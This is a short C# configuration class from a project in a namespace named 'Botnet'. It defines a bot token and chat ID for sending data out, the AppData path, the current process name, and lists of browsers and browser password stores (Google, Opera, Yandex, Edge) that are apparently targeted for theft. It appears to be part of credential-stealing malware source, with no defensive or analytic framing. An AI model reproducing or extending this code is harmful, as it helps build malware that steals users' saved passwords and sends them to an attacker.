using System;

namespace Botnet
{
    class config
    {
        public static char spliter = '|';
        public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string Token = Utilities.GetData("Token");
        public static readonly string Chat_ID = Utilities.GetData("ChatId");

        public static string[] browsers =
            {
                "Google",
                "Opera",
                "Yandex",
                "Google 2",
                "Edge",
                "Edge 2"
            };

        public static string[] passes =
    {
                "Google",
                "Opera",
                "Google 2",
                "Yandex",
                "Yandex 2"
            };

        public static string currProc = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
    }
}
